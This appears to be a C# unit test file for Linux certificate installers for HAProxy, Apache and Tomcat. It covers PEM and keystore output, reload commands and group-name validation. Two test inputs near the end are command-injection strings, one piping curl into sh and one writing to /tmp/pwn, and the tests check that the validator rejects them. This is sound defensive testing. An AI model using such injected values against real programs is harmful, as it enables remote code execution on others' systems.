using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;

using AcmeManager.Plugins.Contracts.Installation;
using AcmeManager.Plugins.Contracts.Storage;
using AcmeManager.Plugins.Linux;

using Microsoft.Extensions.Logging.Abstractions;

namespace AcmeManager.Tests.Unit;

public sealed class LinuxInstallerTests : IDisposable
{
    private readonly string _tempDir;

    public LinuxInstallerTests()
    {
        _tempDir = Path.Combine(Path.GetTempPath(), $"acme-linux-test-{Guid.NewGuid():N}");
        Directory.CreateDirectory(_tempDir);
    }

    public void Dispose()
    {
        if (Directory.Exists(_tempDir))
        {
            Directory.Delete(_tempDir, recursive: true);
        }
    }

    // ---------------- LinuxCertMaterial (pure, cross-platform) ----------------

    [Fact]
    public void FullChainPem_AndPrivateKeyPem_AreWellFormed()
    {
        var bundle = SelfSigned("haproxy.test");

        Assert.Contains("-----BEGIN CERTIFICATE-----", LinuxCertMaterial.FullChainPem(bundle), StringComparison.Ordinal);
        Assert.Contains("-----BEGIN PRIVATE KEY-----", LinuxCertMaterial.PrivateKeyPem(bundle), StringComparison.Ordinal);
    }

    [Fact]
    public void HaProxyPem_ContainsBothCertAndKey()
    {
        var pem = LinuxCertMaterial.HaProxyPem(SelfSigned("haproxy.test"));

        Assert.Contains("-----BEGIN CERTIFICATE-----", pem, StringComparison.Ordinal);
        Assert.Contains("-----BEGIN PRIVATE KEY-----", pem, StringComparison.Ordinal);
        // Cert before key — HAProxy expects the chain first.
        Assert.True(pem.IndexOf("CERTIFICATE", StringComparison.Ordinal)
            < pem.IndexOf("PRIVATE KEY", StringComparison.Ordinal));
    }

    [Fact]
    public void Pkcs12_RoundTripsUnderTheGivenPassword()
    {
        var bundle = SelfSigned("tomcat.test");

        var keystore = LinuxCertMaterial.Pkcs12(bundle, "s3cret");

        var loaded = X509CertificateLoader.LoadPkcs12Collection(keystore, "s3cret");
        Assert.Contains(loaded.OfType<X509Certificate2>(), c => c.HasPrivateKey);
    }

    // ---------------- Capability gating ----------------

    [Fact]
    public async Task Installers_AreAvailableOnlyOnLinux()
    {
        var haproxy = new HaProxyInstaller(new FakeRunner(), NullLogger<HaProxyInstaller>.Instance);
        var apache = new ApacheInstaller(new FakeRunner(), NullLogger<ApacheInstaller>.Instance);
        var tomcat = new TomcatInstaller(new FakeRunner(), new NoSecrets(), NullLogger<TomcatInstaller>.Instance);

        Assert.Equal(OperatingSystem.IsLinux(), (await haproxy.CheckAsync(default)).Available);
        Assert.Equal(OperatingSystem.IsLinux(), (await apache.CheckAsync(default)).Available);
        Assert.Equal(OperatingSystem.IsLinux(), (await tomcat.CheckAsync(default)).Available);
    }

    // ---------------- Installer behavior (file write + reload) ----------------

    [Fact]
    public async Task HaProxyInstaller_WritesCombinedPem_AndRunsReload()
    {
        var runner = new FakeRunner();
        var installer = new HaProxyInstaller(runner, NullLogger<HaProxyInstaller>.Instance);
        var pemPath = Path.Combine(_tempDir, "haproxy", "site.pem");
        var opts = new HaProxyInstallerOptions { PemPath = pemPath, ReloadCommand = "systemctl reload haproxy" };

        await installer.InstallAsync(SelfSigned("haproxy.test"), new InstallContext(opts, Empty), default);

        Assert.True(File.Exists(pemPath));
        var content = await File.ReadAllTextAsync(pemPath);
        Assert.Contains("-----BEGIN CERTIFICATE-----", content, StringComparison.Ordinal);
        Assert.Contains("-----BEGIN PRIVATE KEY-----", content, StringComparison.Ordinal);
        Assert.Equal("systemctl reload haproxy", runner.LastCommand);
    }

    [Fact]
    public async Task ApacheInstaller_WritesCertAndKey_Separately()
    {
        var runner = new FakeRunner();
        var installer = new ApacheInstaller(runner, NullLogger<ApacheInstaller>.Instance);
        var certPath = Path.Combine(_tempDir, "fullchain.pem");
        var keyPath = Path.Combine(_tempDir, "privkey.pem");
        var opts = new ApacheInstallerOptions { CertPath = certPath, KeyPath = keyPath };

        await installer.InstallAsync(SelfSigned("apache.test"), new InstallContext(opts, Empty), default);

        Assert.Contains("CERTIFICATE", await File.ReadAllTextAsync(certPath), StringComparison.Ordinal);
        Assert.Contains("PRIVATE KEY", await File.ReadAllTextAsync(keyPath), StringComparison.Ordinal);
        Assert.DoesNotContain("PRIVATE KEY", await File.ReadAllTextAsync(certPath), StringComparison.Ordinal);
        Assert.Equal("systemctl reload apache2", runner.LastCommand);
    }

    [Fact]
    public async Task TomcatInstaller_WritesLoadableKeystore()
    {
        var runner = new FakeRunner();
        var installer = new TomcatInstaller(runner, new NoSecrets(), NullLogger<TomcatInstaller>.Instance);
        var ksPath = Path.Combine(_tempDir, "keystore.p12");
        var opts = new TomcatInstallerOptions { KeystorePath = ksPath, KeystorePassword = "kspw" };

        await installer.InstallAsync(SelfSigned("tomcat.test"), new InstallContext(opts, Empty), default);

        var loaded = X509CertificateLoader.LoadPkcs12Collection(await File.ReadAllBytesAsync(ksPath), "kspw");
        Assert.NotEmpty(loaded);
        Assert.Equal("systemctl restart tomcat", runner.LastCommand);
    }

    [Fact]
    public async Task HaProxyInstaller_RequiresPemPath()
    {
        var installer = new HaProxyInstaller(new FakeRunner(), NullLogger<HaProxyInstaller>.Instance);
        await Assert.ThrowsAsync<InvalidOperationException>(() =>
            installer.InstallAsync(SelfSigned("x.test"), new InstallContext(new HaProxyInstallerOptions(), Empty), default).AsTask());
    }

    private static readonly IReadOnlyDictionary<string, string> Empty = new Dictionary<string, string>();

    private static CertificateBundle SelfSigned(string cn)
    {
        using var ec = ECDsa.Create(ECCurve.NamedCurves.nistP256);
        var req = new CertificateRequest($"CN={cn}", ec, HashAlgorithmName.SHA256);
        var san = new SubjectAlternativeNameBuilder();
        san.AddDnsName(cn);
        req.CertificateExtensions.Add(san.Build());
        using var cert = req.CreateSelfSigned(DateTimeOffset.UtcNow, DateTimeOffset.UtcNow.AddDays(1));
        return new CertificateBundle(cn, [cn], cert.Export(X509ContentType.Pfx), "",
            cert.NotBefore, cert.NotAfter, cert.Thumbprint);
    }

    private sealed class NoSecrets : AcmeManager.Plugins.Contracts.ISecretResolver
    {
        public Task<string> ResolveAsync(string name, CancellationToken ct) => throw new KeyNotFoundException(name);
    }

    private sealed class FakeRunner : ICommandRunner
    {
        public string? LastCommand { get; private set; }

        public List<(string File, IReadOnlyList<string> Arguments)> Executed { get; } = [];

        public Task RunAsync(string command, TimeSpan timeout, CancellationToken ct)
        {
            LastCommand = command;
            return Task.CompletedTask;
        }

        public Task RunAsync(string file, IReadOnlyList<string> arguments, TimeSpan timeout, CancellationToken ct)
        {
            Executed.Add((file, arguments));
            return Task.CompletedTask;
        }
    }

    [Theory]
    [InlineData("haproxy", true)]
    [InlineData("www-data", true)]
    [InlineData("_ssl", true)]
    [InlineData("machine$", true)]
    [InlineData("", false)]
    [InlineData("haproxy; curl x|sh", false)]
    [InlineData("a'b", false)]
    [InlineData("-flag", false)]
    public void HaProxyGroupName_RejectsAnythingShellLike(string group, bool valid)
    {
        Assert.Equal(valid, HaProxyInstaller.IsValidGroupName(group));
    }

    [Fact]
    public async Task HaProxy_RefusesAnInvalidGroupName_BeforeWritingAnything()
    {
        var runner = new FakeRunner();
        var installer = new HaProxyInstaller(runner, NullLogger<HaProxyInstaller>.Instance);
        var pem = Path.Combine(_tempDir, "site.pem");
        var opts = new HaProxyInstallerOptions { PemPath = pem, Group = "haproxy; id > /tmp/pwn", ReloadCommand = "" };

        await Assert.ThrowsAsync<InvalidOperationException>(async () =>
            await installer.InstallAsync(SelfSigned("site.example"), new InstallContext(opts, new Dictionary<string, string>()), default));

        Assert.False(File.Exists(pem));
        Assert.Empty(runner.Executed);
        Assert.Null(runner.LastCommand);
    }
}